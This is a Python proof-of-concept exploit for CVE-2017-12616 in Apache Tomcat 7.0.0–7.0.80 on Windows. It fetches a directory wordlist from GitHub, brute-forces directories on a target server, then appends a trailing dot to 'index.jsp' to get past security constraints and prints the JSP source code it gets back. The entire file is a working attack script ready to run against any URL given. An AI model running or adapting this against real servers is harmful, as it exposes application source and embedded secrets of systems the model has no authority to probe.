# CVE-2017-12616
# Tomcat Information Disclosure(window)
# version : Apache Tomcat 7.0.0~7.0.80
# version(reg) : ^7\.0\.([0-7][0-9]|80)$

import requests
import argparse
import time
import os

print('''=======================================\n            CVE-2017-12616\n Tomcat Information Disclosure(window)\n=======================================''')

parser = argparse.ArgumentParser(description="Usage: python3 CVE-2017-12616.py -u http://192.168.0.17:8080")
parser.add_argument('--URL', '-u', required=True, help='Target URL (e.g., http://192.168.0.17:8080)')
args = parser.parse_args()


def download_wordlist():
    filename="Directories_All.wordlist"

    if os.path.exists(filename): return True
    
    try:
        response = requests.get("https://github.com/emadshanab/WordLists-20111129/raw/refs/heads/master/Directories_All.wordlist", stream=True)
        response.raise_for_status()

        print(f"[+] download {filename} ...")

        with open(filename, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        print(f"[+] File downloaded successfully as '{filename}'\n")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error downloading the file: {e}")



def read_dir_list():
    download_wordlist()

    with open("Directories_All.wordlist", 'r') as file:
        lines = file.readlines()
        return [line.strip() for line in lines[:1347]] #실행 속도 문제로 1347단어만 테스트 진행


def get_200_dir(URL):
    dir_list = read_dir_list()
    
    print(f"[+] Verifying if the target service is using the VirtualDirContext class . . .")

    for dir in dir_list:
        try:
            response = requests.get(f"{URL}/{dir}/index.jsp")
            if response.status_code == 200 and dir not in ["docs","examples","manager", "host-manager"]:
                print(f"[+] Found 200 directory: {dir}")
                return dir
        except requests.exceptions.RequestException as e:
            print(f"[-] Error with directory: {dir} - {e}")
            print(f"[-] Detected Vulnerability : False")
            return None

    print(f"[-] The target service does not use the VirtualDirContext class")
    print(f"[-] Detected Vulnerability : False")
    exit(1)


def Detected_Vulnerability(URL, forbidden_url):

    #PoC
    poc = f"{URL}/{forbidden_url}/index.jsp."
    print("[+]",poc)

    res = requests.get(poc)
    if res.status_code == 200:
        print(f"[*] Detected Vulnerability : True")
        print("-----------------------------------")
        print(res.text)
        return True
    else:
        print(f"[-] RewriteRule not utilized"); 
        print(f"[-] Detected Vulnerability : False")
        return False


if __name__ == "__main__":
    
    URL= args.URL.rstrip("/")

    virtual_dir = get_200_dir(URL)
    Detected_Vulnerability(URL, virtual_dir)